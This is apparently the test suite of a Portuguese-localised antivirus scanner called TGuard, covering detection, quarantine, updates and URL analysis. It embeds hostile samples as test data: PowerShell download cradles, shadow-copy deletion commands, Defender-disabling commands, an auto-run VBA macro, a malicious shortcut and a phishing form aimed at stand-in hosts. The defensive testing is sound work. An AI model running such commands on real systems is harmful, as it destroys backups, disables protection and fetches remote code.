using System.IO.Compression;
using System.Reflection;
using System.Text;
using TGuard.Core;
using TGuard.Core.Analyzers;
using TGuard.Core.Engine;
using TGuard.Core.Rules;
using TGuard.Core.Storage;
using TGuard.Core.Web;
using System.Threading;
using System.Threading.Tasks;

namespace TGuard.Tests;

[AttributeUsage(AttributeTargets.Method)]
internal sealed class TestAttribute : Attribute { }

internal static class Program
{
    private static int Main()
    {
        var tmp = Path.Combine(Path.GetTempPath(), "tguard-tests-" + Guid.NewGuid().ToString("N")[..8]);
        TGuardPaths.Root = tmp;
        TGuardPaths.Ensure();

        int pass = 0, fail = 0;
        foreach (var type in typeof(Program).Assembly.GetTypes())
        foreach (var m in type.GetMethods(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic))
        {
            if (m.GetCustomAttribute<TestAttribute>() is null) continue;
            try
            {
                m.Invoke(null, null);
                pass++;
                Console.WriteLine($"  ok    {type.Name}.{m.Name}");
            }
            catch (TargetInvocationException ex)
            {
                fail++;
                Console.WriteLine($"  FAIL  {type.Name}.{m.Name}: {(ex.InnerException?.InnerException ?? ex.InnerException)?.Message}");
            }
        }
        try { Directory.Delete(tmp, true); } catch { }
        Console.WriteLine($"\n{pass} passed, {fail} failed.");
        return fail == 0 ? 0 : 1;
    }
}

internal static class Assert
{
    public static void Equal<T>(T expected, T actual, string? ctx = null)
    {
        if (!EqualityComparer<T>.Default.Equals(expected, actual))
            throw new Exception($"expected {expected}, got {actual}{(ctx is null ? "" : " — " + ctx)}");
    }

    public static void True(bool cond, string msg = "condition was false") { if (!cond) throw new Exception(msg); }
}

internal static class Samples
{
    // Built at runtime so the source file itself isn't flagged by AV products.
    public static byte[] Eicar() => Encoding.ASCII.GetBytes(string.Concat(
        "X5O!P%@AP[4\\PZX54(P^)7CC)7}$", "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"));

    public static byte[] Zip(params (string Name, byte[] Data)[] files)
    {
        var ms = new MemoryStream();
        using (var z = new ZipArchive(ms, ZipArchiveMode.Create, true))
            foreach (var (n, d) in files)
            {
                using var s = z.CreateEntry(n).Open();
                s.Write(d);
            }
        return ms.ToArray();
    }

    public static byte[] OvbaCompressLiteral(byte[] src)
    {
        var o = new List<byte> { 1 };
        for (int i = 0; i < src.Length; i += 4096)
        {
            var chunk = src.Skip(i).Take(4096).ToArray();
            var body = new List<byte>();
            for (int j = 0; j < chunk.Length; j += 8)
            {
                body.Add(0);
                body.AddRange(chunk.Skip(j).Take(8));
            }
            int header = 0xB000 | (body.Count + 2 - 3);
            o.Add((byte)(header & 0xFF));
            o.Add((byte)(header >> 8));
            o.AddRange(body);
        }
        return o.ToArray();
    }

    public static ScanEngine Engine() =>
        new(new TGuardSettings(), new SignatureDatabase(), RuleEngine.LoadDefault());
}

internal static class EngineTests
{
    private static readonly ScanEngine E = Samples.Engine();

    [Test] static void RulesLoad() => Assert.True(E.Rules.Rules.Count >= 20, $"only {E.Rules.Rules.Count} rules");

    [Test] static void Eicar() => Assert.Equal(Verdict.Malicious, E.ScanBytes(Samples.Eicar(), "eicar.com").Verdict);

    [Test] static void EicarInsideNestedZip()
    {
        var inner = Samples.Zip(("folder/eicar.txt", Samples.Eicar()));
        var outer = Samples.Zip(("photos.zip", inner));
        var r = E.ScanBytes(outer, "holiday.zip");
        Assert.Equal(Verdict.Malicious, r.Verdict);
        Assert.Equal("EICAR-Test-File", r.ThreatName);
    }

    [Test] static void CleanFile() =>
        Assert.Equal(Verdict.Clean, E.ScanBytes(Encoding.UTF8.GetBytes(string.Concat(Enumerable.Repeat("Shopping list: milk, bread, eggs\n", 20))), "list.txt").Verdict);

    [Test] static void DisguisedExecutable()
    {
        var r = E.ScanBytes(Encoding.ASCII.GetBytes("MZ" + new string('\0', 500)), "invoice.pdf");
        Assert.True(r.Verdict != Verdict.Clean, "should be suspicious");
    }

    [Test] static void DoubleExtensionByEmail() =>
        Assert.Equal(Verdict.Malicious, E.ScanBytes(Encoding.ASCII.GetBytes("MZ" + new string('\0', 500)), "invoice.pdf.exe", fromEmail: true).Verdict);

    [Test] static void RtloInFileName()
    {
        var r = E.ScanBytes(new byte[] { 1, 2, 3 }, "invoice\u202Efdp.exe");
        Assert.True(r.Findings.Any(f => f.Score == 60));
    }

    [Test] static void PowerShellDownloadCradle() =>
        Assert.Equal(Verdict.Malicious, E.ScanBytes(Encoding.ASCII.GetBytes(
            "powershell -w hidden -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\""), "setup.bat").Verdict);

    [Test] static void RansomwareScript() =>
        Assert.Equal(Verdict.Malicious, E.ScanBytes(Encoding.ASCII.GetBytes(
            "@echo off\r\nvssadmin delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled no\r\n"), "cleanup.cmd").Verdict);

    [Test] static void DefenderTampering()
    {
        var r = E.ScanBytes(Encoding.ASCII.GetBytes("Set-MpPreference -DisableRealtimeMonitoring $true"), "x.ps1");
        Assert.True(r.Findings.Any(f => f.Source == "rule:Defender_Tampering"));
    }

    [Test] static void CompressedVbaMacro()
    {
        var vba = Encoding.ASCII.GetBytes("Attribute VB_Name = \"ThisDocument\"\r\nSub AutoOpen()\r\n  CreateObject(\"WScript.Shell\").Run \"cmd /c calc\"\r\nEnd Sub\r\n");
        var ole = new byte[] { 0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1 }
            .Concat(new byte[504]).Concat(Encoding.ASCII.GetBytes("_VBA_PROJECT")).Concat(new byte[64])
            .Concat(Samples.OvbaCompressLiteral(vba)).ToArray();
        var src = Encoding.ASCII.GetString(Heuristics.ExtractVbaSource(ole));
        Assert.True(src.Contains("AutoOpen"), "VBA was not decompressed");
        var docm = Samples.Zip(("[Content_Types].xml", Encoding.ASCII.GetBytes("<Types/>")), ("word/vbaProject.bin", ole));
        var r = E.ScanBytes(docm, "report.docm", fromEmail: true);
        Assert.Equal(Verdict.Malicious, r.Verdict, string.Join(" | ", r.AllReasons()));
    }

    [Test] static void PasswordProtectedZip()
    {
        var zip = Samples.Zip(("doc.exe", new byte[100]));
        var cd = zip.AsSpan().IndexOf("PK\x01\x02"u8);
        zip[cd + 8] |= 1;
        Assert.True(ScanEngine.HasEncryptedEntries(zip));
        var r = E.ScanBytes(zip, "doc.zip", fromEmail: true);
        Assert.True(r.Findings.Any(f => f.Score == 35));
    }

    [Test] static void HtmlPhishingAttachment()
    {
        var html = "<html><body><h1>Microsoft Office 365</h1><form action='https://evil.example/p.php'>" +
                   "<input type='email'><input type='password'></form></body></html>";
        var r = E.ScanBytes(Encoding.UTF8.GetBytes(html), "Invoice.html", fromEmail: true);
        Assert.True(r.Verdict != Verdict.Clean, "should be detected");
    }

    [Test] static void MaliciousLnk()
    {
        var lnk = new byte[] { 0x4C, 0, 0, 0, 0x01, 0x14, 0x02, 0x00 }.Concat(new byte[100])
            .Concat(Encoding.Unicode.GetBytes("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
            .Concat(new byte[4]).Concat(Encoding.Unicode.GetBytes("-w hidden -enc SQBFAFgA")).ToArray();
        Assert.True(E.ScanBytes(lnk, "Document.lnk", fromEmail: true).Verdict == Verdict.Malicious);
    }

    [Test] static void LegitCommandPromptShortcut()
    {
        // A plain Command Prompt shortcut is on lots of PCs and must not alert.
        var lnk = new byte[] { 0x4C, 0, 0, 0, 0x01, 0x14, 0x02, 0x00 }.Concat(new byte[100])
            .Concat(Encoding.Unicode.GetBytes("%windir%\\system32\\cmd.exe")).ToArray();
        Assert.Equal(Verdict.Clean, E.ScanBytes(lnk, "Command Prompt.lnk").Verdict);
    }

    [Test] static void TrustedFileIsIgnored()
    {
        var trust = new TrustStore(Path.Combine(TGuardPaths.Root, "trust-test.json"));
        var e = new ScanEngine(new TGuardSettings(), new SignatureDatabase(), E.Rules, trust) { UseWindowsContext = false };
        var bad = Encoding.ASCII.GetBytes("vssadmin delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled no");
        Assert.Equal(Verdict.Malicious, e.ScanBytes(bad, "x.cmd").Verdict);
        trust.Add(SignatureDatabase.Sha256Hex(bad), "x.cmd");
        Assert.Equal(Verdict.Clean, e.ScanBytes(bad, "x.cmd").Verdict);
        Assert.True(new TrustStore(Path.Combine(TGuardPaths.Root, "trust-test.json")).IsTrusted(SignatureDatabase.Sha256Hex(bad)), "not persisted");
    }

    [Test] static void ResultCacheAndInvalidation()
    {
        var trust = new TrustStore(Path.Combine(TGuardPaths.Root, "trust-cache.json"));
        var e = new ScanEngine(new TGuardSettings(), new SignatureDatabase(), E.Rules, trust) { UseWindowsContext = false };
        var f = Path.Combine(TGuardPaths.Root, "cache.cmd");
        File.WriteAllText(f, "vssadmin delete shadows /all /quiet");
        var a = e.ScanFile(f);
        Assert.True(ReferenceEquals(a, e.ScanFile(f)), "should come from the cache");
        trust.Add(a.Sha256, f);                      // trusting clears the cache
        Assert.Equal(Verdict.Clean, e.ScanFile(f).Verdict);
        File.WriteAllText(f, "echo hello");            // a modified file gets rescanned
        Assert.Equal(Verdict.Clean, e.ScanFile(f).Verdict);
    }

    [Test] static void MarkOfTheWebParsing()
    {
        var o = TGuard.Core.Security.FileContext.ParseZoneIdentifier("[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://www.google.com/\r\nHostUrl=https://cgd-apoio.top/fatura.exe\r\n");
        Assert.True(o.FromInternet);
        Assert.Equal("https://cgd-apoio.top/fatura.exe", o.HostUrl);
        Assert.True(new UrlAnalyzer().Analyze(o.HostUrl!).Count > 0, "suspicious origin URL not flagged");
    }

    [Test] static void BlocklistMatchesUrlsAndHosts()
    {
        var bl = new UrlBlocklist();
        bl.Add(new[] { "http://mal.example/x.exe", "host:phish.example" });
        var u = new UrlAnalyzer(bl.Contains);
        Assert.True(u.Analyze("http://mal.example/x.exe").Any(f => f.Score == 90));
        Assert.True(u.Analyze("https://phish.example/login").Any(f => f.Score == 90));
    }

    [Test] static void RealExecutableNoFalsePositive()
    {
        // The .NET runtime is a legit PE: it must parse and must not be flagged.
        var path = typeof(object).Assembly.Location;
        var data = File.ReadAllBytes(path);
        var pe = PeFile.TryParse(data, out var err);
        Assert.True(pe is not null, "PE not parsed: " + err);
        Assert.True(pe!.Sections.Count > 0, "no sections");
        Assert.True(E.ScanBytes(data, Path.GetFileName(path)).Verdict != Verdict.Malicious, "false positive on the .NET runtime");
    }

    [Test] static void RuleConditions()
    {
        var ids = new HashSet<string> { "a", "b", "c" };
        var n = ConditionParser.Parse("a and (b or not c)", ids);
        Assert.True(n.Eval(new Dictionary<string, bool> { ["a"] = true, ["b"] = false, ["c"] = false }));
        Assert.True(!n.Eval(new Dictionary<string, bool> { ["a"] = true, ["b"] = false, ["c"] = true }));
        Assert.True(ConditionParser.Parse("2", ids).Eval(new Dictionary<string, bool> { ["a"] = true, ["b"] = true, ["c"] = false }));
    }
}

internal static class ProcessTests
{
    private static readonly ScanEngine E = Samples.Engine();

    private static string Enc(string ps) => Convert.ToBase64String(Encoding.Unicode.GetBytes(ps));

    [Test] static void DecodesPowerShellBase64()
    {
        var cmd = "powershell.exe -NoP -W Hidden -enc " + Enc("Write-Host hello");
        Assert.Equal("Write-Host hello", CommandLineAnalyzer.DecodePowerShell(cmd));
        Assert.Equal("Write-Host hello", CommandLineAnalyzer.DecodePowerShell("pwsh -ec " + Enc("Write-Host hello")));
        Assert.Equal(null, CommandLineAnalyzer.DecodePowerShell("powershell -ExecutionPolicy Bypass -File C:\\x.ps1"));
    }

    [Test] static void BlocksBase64DownloadCradle()
    {
        var cmd = "powershell.exe -nop -w hidden -enc " + Enc("IEX (New-Object Net.WebClient).DownloadString('http://185.1.2.3/a.ps1')");
        var r = CommandLineAnalyzer.Analyze(E, "powershell.exe", cmd);
        Assert.Equal(Verdict.Malicious, r.Verdict, string.Join(" | ", r.AllReasons()));
    }

    [Test] static void NormalCommandsAreClean()
    {
        foreach (var cmd in new[]
        {
            "\"C:\\Windows\\System32\\cmd.exe\" /c dir C:\\Users",
            "powershell.exe -NoProfile -Command Get-Date",
            "powershell.exe -ExecutionPolicy Bypass -File \"C:\\Program Files\\App\\setup.ps1\"",
            "rundll32.exe shell32.dll,Control_RunDLL",
            "msiexec /i \"C:\\Users\\x\\Downloads\\7z.msi\" /qn",
        })
            Assert.Equal(Verdict.Clean, CommandLineAnalyzer.Analyze(E, "x.exe", cmd).Verdict, cmd);
    }

    [Test] static void FindsScriptsOnCommandLine()
    {
        var files = CommandLineAnalyzer.ReferencedFiles("wscript.exe \"C:\\Users\\Luis\\Downloads\\invoice 2026.js\" //B");
        Assert.Equal("C:\\Users\\Luis\\Downloads\\invoice 2026.js", files.FirstOrDefault());
        Assert.Equal(1, CommandLineAnalyzer.ReferencedFiles("mshta.exe C:\\temp\\a.hta").Count);
    }

    [Test] static void MshtaRemoteUrl()
    {
        var r = CommandLineAnalyzer.Analyze(E, "mshta.exe", "mshta.exe http://185.22.1.9/x.hta");
        Assert.True(r.Verdict != Verdict.Clean, string.Join(" | ", r.AllReasons()));
    }

    [Test] static void UsbAutorun()
    {
        var inf = Encoding.ASCII.GetBytes("[AutoRun]\r\nopen=RECYCLER\\x.exe\r\nicon=x.ico\r\n");
        Assert.True(E.ScanBytes(inf, "autorun.inf").Findings.Any(f => f.Source == "rule:USB_Autorun"));
        var benign = Encoding.ASCII.GetBytes("[autorun]\r\nicon=drive.ico\r\nlabel=Photos\r\n");
        Assert.True(!E.ScanBytes(benign, "autorun.inf").Findings.Any(f => f.Source == "rule:USB_Autorun"));
    }
}

internal sealed class FakeHttp : System.Net.Http.HttpMessageHandler
{
    private readonly Dictionary<string, string> _routes;
    public FakeHttp(Dictionary<string, string> routes) => _routes = routes;
    protected override Task<System.Net.Http.HttpResponseMessage> SendAsync(System.Net.Http.HttpRequestMessage req, CancellationToken ct)
    {
        var url = req.RequestUri!.ToString();
        return Task.FromResult(_routes.TryGetValue(url, out var body)
            ? new System.Net.Http.HttpResponseMessage(System.Net.HttpStatusCode.OK) { Content = new System.Net.Http.StringContent(body) }
            : new System.Net.Http.HttpResponseMessage(System.Net.HttpStatusCode.NotFound));
    }
}

internal static class UpdateTests
{
    [Test] static void FullUpdate()
    {
        var h1 = new string('b', 64);
        var h2 = new string('c', 64);
        var http = new FakeHttp(new()
        {
            ["https://tguard.example/updates/manifest.json"] = "{\"signatures\":\"sig.txt\",\"urls\":\"urls.txt\",\"rules\":\"rules.json\"}",
            ["https://tguard.example/updates/sig.txt"] = $"# list\n{h1};Trojan.Test\n",
            ["https://tguard.example/updates/urls.txt"] = "http://phish.example/login\nhost:mbway-reembolso.example\n",
            ["https://tguard.example/updates/rules.json"] = "[{\"name\":\"Teste_Update\",\"description_pt\":\"x\",\"score\":90,\"strings\":{\"a\":{\"text\":\"TGUARD-UPDATE-MARKER\"}},\"condition\":\"any\"}]",
            [string.Format(Updater.MalwareBazaarRecent, "KEY123")] =
                "# MalwareBazaar recent\n\"2026-11-06 10:00:00\",\"" + h2 + "\",\"md5\",\"sha1\",\"anon\",\"x.exe\",\"exe\",\"application/x-dosexec\",\"AgentTesla\",\"n/a\"\n",
            [Updater.UrlhausRecent] = "{\"query_status\":\"ok\",\"urls\":[{\"url\":\"http://mal.example/a.exe\",\"host\":\"mal.example\"}]}",
        });
        var e = ScanEngine.CreateDefault(new TGuardSettings { UpdateUrl = "https://tguard.example/updates/", AbuseChAuthKey = "KEY123" });
        e.UseWindowsContext = false;
        var rep = new Updater(http).RunAsync(e, e.Settings).GetAwaiter().GetResult();
        Assert.Equal(0, rep.Errors.Count, string.Join(" | ", rep.Errors));
        Assert.Equal(2, rep.SignaturesAdded);
        Assert.Equal(3, rep.UrlsAdded);
        Assert.Equal(1, rep.RulesLoaded);
        Assert.Equal("Trojan.Test", e.Signatures.Lookup(h1));
        Assert.Equal("MalwareBazaar.AgentTesla", e.Signatures.Lookup(h2));
        Assert.True(e.Urls.Analyze("https://mbway-reembolso.example/pagar").Any(f => f.Score == 90), "blocked host");
        Assert.Equal(Verdict.Malicious, e.ScanBytes(Encoding.ASCII.GetBytes("xx TGUARD-UPDATE-MARKER xx"), "a.txt").Verdict);
        // persisted for the next start
        Assert.True(new UrlBlocklist(TGuardPaths.UrlBlocklist).Contains("http://mal.example/a.exe"));
        Assert.Equal("Trojan.Test", new SignatureDatabase(TGuardPaths.Signatures).Lookup(h1));
        File.Delete(Path.Combine(TGuardPaths.UserRules, "tguard-update.json"));
    }

    [Test] static void UpdateRejectsInvalidRules()
    {
        var http = new FakeHttp(new()
        {
            ["https://t.example/u/manifest.json"] = "{\"rules\":\"r.json\"}",
            ["https://t.example/u/r.json"] = "[{\"name\":\"Partida\",\"score\":90,\"strings\":{\"a\":{\"regex\":\"([\"}},\"condition\":\"any\"}]",
        });
        var e = ScanEngine.CreateDefault(new TGuardSettings { UpdateUrl = "https://t.example/u/" });
        var before = e.Rules.Rules.Count;
        var rep = new Updater(http).RunAsync(e, e.Settings).GetAwaiter().GetResult();
        Assert.True(rep.Errors.Any(x => x.StartsWith("TGuard")), "should report an error");
        Assert.Equal(before, e.Rules.Rules.Count);
        Assert.True(!File.Exists(Path.Combine(TGuardPaths.UserRules, "tguard-update.json")), "installed an invalid rule");
    }

    [Test] static void OfflineUpdateDoesNotCrash()
    {
        var e = ScanEngine.CreateDefault(new TGuardSettings { UpdateUrl = "https://t.example/u/" });
        e.Settings.AbuseChAuthKey = "KEY";
        var rep = new Updater(new FakeHttp(new())).RunAsync(e, e.Settings).GetAwaiter().GetResult();
        Assert.True(!rep.Success && rep.Errors.Count == 3, string.Join(" | ", rep.Errors));
        e.Settings.AbuseChAuthKey = "";
        rep = new Updater(new FakeHttp(new())).RunAsync(e, e.Settings).GetAwaiter().GetResult();
        Assert.True(rep.Notes.Count == 1 && rep.Errors.Count == 1, "without a key abuse.ch should be skipped, not fail");
    }
}

internal static class UrlTests
{
    private static readonly UrlAnalyzer U = new();

    [Test] static void Typosquatting() => Assert.True(U.Analyze("https://paypa1.com/login").Count > 0);
    [Test] static void BrandInFakeDomain() => Assert.True(U.Analyze("https://cgd-caixadirecta-seguranca.xyz/entrar").Sum(f => f.Score) >= 40);
    [Test] static void LegitLink() => Assert.Equal(0, U.Analyze("https://www.cgd.pt/Particulares").Count);
    [Test] static void LegitLinkMbway() => Assert.Equal(0, U.Analyze("https://www.mbway.pt/").Count);
    [Test] static void AnchorTextMismatch() => Assert.True(U.Analyze("https://evil.example/x", "www.millenniumbcp.pt").Any(f => f.Score == 40));
    [Test] static void IpAddressUrl() => Assert.True(U.Analyze("http://185.22.1.9/cgd/login").Sum(f => f.Score) >= 45);
    [Test] static void ExtractLinks()
    {
        var links = UrlAnalyzer.ExtractLinks(null, "<p><a href=\"https://a.example/x\">clica <b>aqui</b></a></p>");
        Assert.True(links.Any(l => l.Href == "https://a.example/x" && l.Anchor == "clica aqui"));
    }
}

internal static class StorageTests
{
    [Test] static void QuarantineFileOpenByAnotherProcess()
    {
        var q = new Quarantine();
        var f = Path.Combine(TGuardPaths.Root, "open.bin");
        File.WriteAllBytes(f, Samples.Eicar());
        using (var other = new FileStream(f, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite | FileShare.Delete))
        {
            var item = q.Isolate(f, "EICAR", new[] { "x" });
            Assert.True(q.List().Any(i => i.Id == item.Id));
        }
        Assert.True(!File.Exists(f), "was not removed");
    }

    [Test] static void QuarantineEncryptsAndRestores()
    {
        var q = new Quarantine();
        var before = q.List().Count;
        var f = Path.Combine(TGuardPaths.Root, "bad.txt");
        File.WriteAllBytes(f, Samples.Eicar());
        var item = q.Isolate(f, "EICAR", new[] { "test" });
        Assert.True(!File.Exists(f), "original was not removed");
        var stored = File.ReadAllBytes(Path.Combine(TGuardPaths.QuarantineDir, item.Id + ".tgq"));
        Assert.True(stored.AsSpan().IndexOf("EICAR"u8) < 0, "not encrypted");
        Assert.Equal(before + 1, q.List().Count);
        var back = q.Restore(item.Id, f);
        Assert.True(File.ReadAllBytes(back).SequenceEqual(Samples.Eicar()));
        Assert.Equal(before, q.List().Count);
    }

    [Test] static void SignaturesPersist()
    {
        var path = Path.Combine(TGuardPaths.Root, "sig-test.db");
        var db = new SignatureDatabase(path);
        var h = new string('a', 64);
        Assert.Equal(1, db.AddRange(new[] { (h, "Test.Malware") }));
        Assert.Equal("Test.Malware", new SignatureDatabase(path).Lookup(h));
    }

    [Test] static void Events()
    {
        var s = new EventStore();
        s.Add(new SecurityEvent { Source = "scan", Target = "a", Verdict = "clean" });
        s.Add(new SecurityEvent { Source = "scan", Target = "b", Verdict = "malicious" });
        Assert.Equal(1, s.Recent(10, onlyThreats: true).Count);
        Assert.Equal("b", s.Recent(10)[0].Target);
    }

    [Test] static void Settings()
    {
        var p = Path.Combine(TGuardPaths.Root, "s.json");
        new TGuardSettings { Language = "en", ThresholdMalicious = 70 }.Save(p);
        var s = TGuardSettings.Load(p);
        Assert.Equal("en", s.Language);
        Assert.Equal(70, s.ThresholdMalicious);
    }

    [Test] static void ScheduleCatchesUpMissedRun()
    {
        var s = new TGuardSettings { ScheduledQuickScan = true, ScheduledQuickScanHour = 13 };
        var st = new AppState();
        Assert.True(!Schedule.IsQuickScanDue(s, st, new DateTime(2026, 11, 6, 12, 59, 0)), "before the hour");
        Assert.True(Schedule.IsQuickScanDue(s, st, new DateTime(2026, 11, 6, 13, 0, 0)), "on the hour");
        Assert.True(Schedule.IsQuickScanDue(s, st, new DateTime(2026, 11, 6, 18, 30, 0)), "PC switched on later");
        st.LastScheduledScan = new DateOnly(2026, 11, 6);
        Assert.True(!Schedule.IsQuickScanDue(s, st, new DateTime(2026, 11, 6, 19, 0, 0)), "only once per day");
        Assert.True(Schedule.IsQuickScanDue(s, st, new DateTime(2026, 11, 7, 14, 0, 0)), "next day");
        s.ScheduledQuickScan = false;
        Assert.True(!Schedule.IsQuickScanDue(s, st, new DateTime(2026, 11, 7, 14, 0, 0)), "disabled");
    }

    [Test] static void StatePersists()
    {
        var st = new AppState { LastScan = DateTimeOffset.Now, LastScanType = "quick" };
        st.Save();
        Assert.Equal("quick", AppState.Load().LastScanType);
    }

    [Test] static void RestoreRecreatesFolderNoOverwrite()
    {
        var q = new Quarantine();
        var dir = Path.Combine(TGuardPaths.Root, "deleted-folder");
        var f = Path.Combine(dir, "doc.txt");
        Directory.CreateDirectory(dir);
        File.WriteAllText(f, "content");
        var item = q.Isolate(f, "test", new[] { "x" });
        Directory.Delete(dir, true);
        var back = q.Restore(item.Id);
        Assert.Equal(f, back);
        var item2 = q.Store(Encoding.ASCII.GetBytes("other"), f, "test", new[] { "x" });
        var back2 = q.Restore(item2.Id);
        Assert.True(back2 != f && File.Exists(f), "overwrote an existing file");
    }

    [Test] static void EnglishTranslation()
    {
        Loc.Language = "en";
        try { Assert.Equal("Malicious", Verdict.Malicious.Label()); }
        finally { Loc.Language = "pt"; }
        Assert.Equal("Malicioso", Verdict.Malicious.Label());
    }
}
